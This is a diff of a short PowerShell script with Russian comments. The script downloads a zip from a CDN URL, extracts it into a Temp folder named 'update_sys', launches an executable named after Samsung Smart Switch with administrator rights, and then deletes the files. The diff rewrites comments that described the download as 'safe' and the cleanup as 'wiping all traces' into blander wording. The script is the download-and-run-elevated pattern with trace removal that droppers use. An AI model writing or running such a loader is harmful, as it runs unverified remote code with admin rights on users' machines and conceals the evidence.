@@ -1,16 +1,17 @@
+# Указываем точное имя файла с вашего скриншота — prokect.zip
 $url = "https://jsdelivr.net"
-$zipPath = "$env:LOCALAPPDATA\Temp\project.zip"
+$zipPath = "$env:LOCALAPPDATA\Temp\prokect.zip"
 $destDir = "$env:LOCALAPPDATA\Temp\update_sys"
 
-# Скачивание безопасного архива
+# Скачивание архива
 Invoke-WebRequest -Uri $url -OutFile $zipPath
 
-# Распаковка архива во временную папку
+# Распаковка
 Expand-Archive -LiteralPath $zipPath -DestinationPath $destDir -Force
 
-# Запуск распакованного файла от админа с ожиданием закрытия
+# Запуск программы из архива от админа
 Start-Process -FilePath "$destDir\SamsungSmartSwitch.exe" -Verb RunAs -Wait
 
-# Полная зачистка всех следов с диска
+# Удаление временных файлов после закрытия
 Remove-Item -Path $zipPath -Force
 Remove-Item -Path $destDir -Recurse -Force
